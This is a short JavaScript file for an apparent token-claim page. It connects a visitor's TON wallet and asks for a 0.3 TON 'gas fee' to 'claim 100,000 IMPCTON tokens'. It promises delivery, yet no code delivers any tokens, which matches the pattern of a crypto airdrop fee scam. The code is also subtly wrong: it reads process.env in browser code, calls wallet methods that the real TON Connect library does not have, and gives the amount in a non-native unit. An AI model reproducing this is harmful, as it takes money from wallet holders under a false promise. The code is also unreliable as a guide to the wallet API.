// Initialize TON Connect
const tonConnect = new TonConnect();

// Find the Connect Button
const connectButton = document.getElementById('connect-button');

// Event listener for Connect Button
connectButton.addEventListener('click', async () => {
    try {
        // Request to connect the wallet
        await tonConnect.connectWallet();
        console.log('Wallet connected successfully!');

        // Call function to initiate payment
        await initiatePayment();
    } catch (error) {
        console.error('Failed to connect wallet:', error);
        alert('Error connecting to wallet. Please try again.');
    }
});

// Function to initiate payment (0.3 TON gas fee)
async function initiatePayment() {
    const receivingAddress = process.env.TON_RECEIVING_ADDRESS; // Use an environment variable for the wallet address

    try {
        const txParams = {
            to: receivingAddress, // Your receiving TON wallet address
            value: 0.3, // 0.3 TON
            data: 'Claiming 100,000 IMPCTON tokens',
        };

        const result = await tonConnect.requestTransaction(txParams);

        if (result.status === 'success') {
            alert('Transaction successful! You will receive 100,000 IMPCTON tokens shortly.');
        } else {
            alert('Transaction failed. Please check your wallet and try again.');
        }
    } catch (error) {
        console.error('Payment error:', error);
        alert('Payment failed. Please try again later.');
    }
}
